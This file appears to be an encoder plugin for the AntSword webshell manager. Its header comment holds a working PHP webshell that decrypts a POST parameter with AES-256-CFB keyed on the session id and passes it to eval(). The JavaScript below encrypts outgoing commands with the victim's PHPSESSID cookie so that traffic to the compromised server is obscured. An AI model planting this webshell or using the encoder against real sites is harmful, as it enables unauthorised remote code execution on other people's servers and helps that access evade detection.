/**
 * php::aes-256-cfb (zeroPadding)编码器
 * Create at: 2019/05/10 01:10:53
 * Author: @Medicean
 * 
-----------------------------------------------
<?php
@session_start();
$pwd='ant';
$key=substr(str_pad(session_id(),32,'0'),0,32);
$iv=$key;
@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-256-CFB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING, $iv));
?>

-----------------------------------------------
KEY的长度	aes-x-cbc
16	aes-128-cbc
24	aes-192-cbc
32	aes-256-cbc
 */

'use strict';
var CryptoJS = require('crypto-js');

function get_cookie(Name, CookieStr="") {
   var search = Name + "="
   var returnvalue = "";
   if (CookieStr.length > 0) {
     var sd = CookieStr.indexOf(search);
     if (sd!= -1) {
        sd += search.length;
        var end = CookieStr.indexOf(";", sd);
        if (end == -1){
          end = CookieStr.length;
        }
        returnvalue = window.unescape(CookieStr.substring(sd, end));
      }
   } 
   return returnvalue;
}

function decryptText(keyStr, text) {
  let buff = Buffer.alloc(32, '0');
  buff.write(keyStr,0);
  keyStr = buff.toString();
  let decodetext = CryptoJS.AES.decrypt(text, CryptoJS.enc.Utf8.parse(keyStr), {
    iv: CryptoJS.enc.Utf8.parse(keyStr),
    mode: CryptoJS.mode.CFB,
    padding: CryptoJS.pad.ZeroPadding
  }).toString(CryptoJS.enc.Utf8)
  return decodetext;
}

function encryptText(keyStr, text) {
  let buff = Buffer.alloc(32, '0');
  buff.write(keyStr,0);
  keyStr = buff.toString();
  let encodetext = CryptoJS.AES.encrypt(text, CryptoJS.enc.Utf8.parse(keyStr), {
    iv: CryptoJS.enc.Utf8.parse(keyStr),
    mode: CryptoJS.mode.CFB,
    padding: CryptoJS.pad.ZeroPadding,
  }).toString()
  return encodetext;
}

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
module.exports = (pwd, data, ext={}) => {
  // ##########    请在下方编写你自己的代码   ###################
  // 从扩展中获取 shell 配置
  let headers = ext.opts.httpConf.headers;
  if(!headers.hasOwnProperty('Cookie')) {
    window.toastr.error("请先设置 Cookie (大小写敏感), 可通过浏览网站获取Cookie", "错误");
    return data;
  }
  let session_key = "PHPSESSID";
  let keyStr = get_cookie(session_key, headers['Cookie']);
  if(keyStr.length === 0) {
    window.toastr.error("未在 Cookie 中发现PHPSESSID", "错误");
    return data;
  }
  data[pwd] = encryptText(keyStr, data['_']);
  // ##########    请在上方编写你自己的代码   ###################
  // 删除 _ 原有的payload
  delete data['_'];
  // 返回编码器处理后的 payload 数组
  return data;
}
